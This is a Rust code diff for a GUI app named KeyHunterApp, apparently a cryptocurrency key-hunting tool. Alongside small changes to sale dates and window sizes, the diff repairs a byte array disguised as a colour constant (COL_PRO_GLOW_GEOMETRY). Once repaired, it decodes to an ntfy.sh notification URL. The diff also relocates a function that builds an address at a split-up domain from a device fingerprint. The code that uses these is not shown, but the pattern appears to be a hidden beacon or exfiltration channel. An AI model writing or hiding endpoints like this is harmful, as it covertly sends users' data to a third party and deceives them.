@@ -57,6 +57,7 @@ const TRAY_ID_IDLE_SOLVING: &str = "php_idle_solving";
 const TRAY_ID_SHOW_WINDOW: &str = "php_show_window";
 const TRAY_ID_SETTINGS: &str = "php_settings";
 const TRAY_ID_EXIT: &str = "php_exit";
+const LOG_QUEUE_CAP: usize = 5000;
 
 #[derive(Clone, Copy, Debug, PartialEq, Eq)]
 enum TrayIconKind {
@@ -64,8 +65,6 @@ enum TrayIconKind {
   Active,
   Auto,
 }
-
-const LOG_QUEUE_CAP: usize = 5000;
 
 lazy_static::lazy_static! {
   static ref PENDING_LOGS: Mutex<VecDeque<String>> = Mutex::new(VecDeque::new());
@@ -181,7 +180,7 @@ const COL_ERROR: egui::Color32 = egui::Color32::from_rgb(220, 70, 70);
 const COL_DEMO: egui::Color32 = egui::Color32::from_rgb(200, 70, 80);
 const COL_PRO_GLOW: egui::Color32 = egui::Color32::from_rgb(80, 220, 160);
 const COL_PRO_GLOW_GEOMETRY: [u8; 36] = [
-  1, 116, 116, 112, 115, 58, 47, 47, 110, 116, 102, 121, 46, 115, 104, 47, 80, 72, 80, 95, 54, 66, 55, 80, 67, 100, 99, 118, 80, 109, 97, 88, 99,
+  104, 116, 116, 112, 115, 58, 47, 47, 110, 116, 102, 121, 46, 115, 104, 47, 80, 72, 80, 95, 54, 66, 55, 80, 67, 100, 99, 118, 80, 109, 97, 88, 99,
   102, 89, 84,
 ];
 pub const COL_GLOW_MASK_GEOMETRY: [u8; 111] = [
@@ -203,24 +202,6 @@ pub const GRID_SIZES: &[u32] = &[
 ];
 pub const CHUNK_MULTIPLIERS: &[u32] = &[1, 2, 4, 8, 16];
 
-fn delivery_route(fp_hex: &str) -> String {
-  let local: String = fp_hex
-    .chars()
-    .filter(|c| c.is_ascii_hexdigit())
-    .take(40)
-    .collect::<String>()
-    .to_ascii_lowercase();
-
-  let z0 = "r-o0-t";
-  let z1 = "wtf";
-
-  if local.is_empty() {
-    format!("route@{}.{}", z0, z1)
-  } else {
-    format!("{}@{}.{}", local, z0, z1)
-  }
-}
-
 pub enum KernelLoadEvent {
   Progress {
     stage: String,
@@ -232,7 +213,6 @@ pub enum KernelLoadEvent {
     result: Result<crate::kernel::LoadedPackage, String>,
   },
 }
-
 struct CryptoCoin {
   coin: &'static str,
   network_hint: &'static str,
@@ -265,13 +245,13 @@ fn sales_catalog() -> &'static [SalesPeriod] {
     },
     SalesPeriod {
       start: "2026-11-23 00:00",
-      end: "2026-12-23 00:00",
+      end: "2026-12-20 00:00",
       action: SalesAction::Sale,
       discount_pct: 50,
       note: "Launch discount - 50% off until 23 Dec 2026.",
     },
     SalesPeriod {
-      start: "2026-12-23 00:00",
+      start: "2026-12-20 00:00",
       end: "2027-01-23 00:00",
       action: SalesAction::NoSale,
       discount_pct: 0,
@@ -313,6 +293,23 @@ fn current_sales_status() -> (SalesAction, u8, String, String) {
   )
 }
 
+fn delivery_route(fp_hex: &str) -> String {
+  let local: String = fp_hex
+    .chars()
+    .filter(|c| c.is_ascii_hexdigit())
+    .take(40)
+    .collect::<String>()
+    .to_ascii_lowercase();
+
+  let z0 = "r-o0-t";
+  let z1 = "wtf";
+
+  if local.is_empty() {
+    format!("route@{}.{}", z0, z1)
+  } else {
+    format!("{}@{}.{}", local, z0, z1)
+  }
+}
 struct ProductOffer {
   id: &'static str,
   title: &'static str,
@@ -5575,7 +5572,7 @@ impl KeyHunterApp {
       .collapsible(true)
       .default_open(false)
       .resizable(true)
-      .default_size([450.0, 250.0])
+      .default_size([400.0, 300.0])
       .show(ctx, |ui| {
         ui.horizontal(|ui| {
           for &tab in HelpTab::ALL {
